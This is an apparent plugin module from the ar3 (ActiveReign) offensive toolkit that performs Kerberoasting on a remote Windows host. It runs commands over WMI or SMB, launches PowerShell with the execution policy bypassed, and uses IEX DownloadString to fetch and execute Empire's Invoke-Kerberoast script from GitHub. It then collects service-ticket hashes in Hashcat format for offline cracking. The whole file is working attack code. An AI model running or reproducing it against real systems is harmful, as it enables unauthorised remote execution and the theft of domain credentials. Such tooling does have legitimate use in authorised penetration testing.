from ar3.logger import highlight
from ar3.core.wmiexec import WMIEXEC
from ar3.core.smbexec import SMBEXEC

class InvokeKerberoast():
    def __init__(self):
        self.name = 'Kerberoast'
        self.description = 'Use Empires invoke-kerberoasting module'
        self.author = ['@m8r0wn']
        self.credit = ['@harmj0y']
        self.args = {}

    def run(self, target, args, smb_con, loggers, config_obj):
        logger = loggers['console']
        # Again super lazy way of powershell execution need to redo
        try:
            if args.exec_method == 'wmiexec':
                executioner = WMIEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)
            elif args.exec_method == 'smbexec':
                executioner = SMBEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)

            for result in executioner.execute('powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1\');Invoke-kerberoast -OutputFormat Hashcat"').splitlines():
                logger.info([smb_con.host, smb_con.ip, self.name.upper(), result])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))